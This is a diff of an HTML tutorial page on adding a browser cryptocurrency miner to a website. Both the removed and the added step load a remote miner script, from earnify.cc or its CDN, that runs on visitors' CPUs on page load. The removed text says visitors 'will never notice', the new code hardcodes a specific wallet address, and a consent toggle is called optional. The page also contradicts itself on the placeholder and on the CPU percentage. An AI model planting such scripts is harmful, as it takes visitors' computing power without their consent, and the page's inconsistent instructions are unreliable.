@@ -371,18 +371,13 @@
 
         <h3 id="step-2">2. Add the script to your site</h3>
         <p>Insert the following script tag just before your closing <code>&lt;/body&gt;</code> tag on every page where you want mining to run:</p>
-        <pre><code>&lt;script src="https://cdn.earnify.cc/miner.js"&gt;&lt;/script&gt;
-&lt;script&gt;
-  const miner = new EarnifyMiner({
-    pool: "stratum+tcp://minotaurx.mine.zpool.ca:7019",
-    wallet: "YOUR_RVN_ADDRESS",
-    workerName: "earnify",
-    threads: navigator.hardwareConcurrency - 1,
-    throttle: 0.3
-  });
-  miner.start();
-&lt;/script&gt;</code></pre>
-        <p>Replace <code>YOUR_RVN_ADDRESS</code> with your actual wallet address. The <code>throttle: 0.3</code> setting reserves 30% of CPU capacity — visitors will never notice the miner running.</p>
+        <pre><code>&lt;script type="module"&gt;
+     
+    import { autoMine } from "https://earnify.cc/miner.js";
+      // Your RavenCoin Address     percent of users pc, 0.1 = 1%, 1 = 100%
+      autoMine("RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", 0.2);
+    &lt;/script&gt;</code></pre>
+        <p>Replace <code>YOUR_RAVENCOIN_ADDRESS</code> with your actual Ravencoin address. The second parameter (<code>0.2</code>) controls the percentage of CPU capacity to use — 0.2 = 20%. Adjust this value based on your audience's tolerance.</p>
 
         <h3 id="step-3">3. Add an opt-out toggle (optional but recommended)</h3>
         <p>Good-faith disclosure builds trust. Add a simple toggle for users who prefer not to participate:</p>
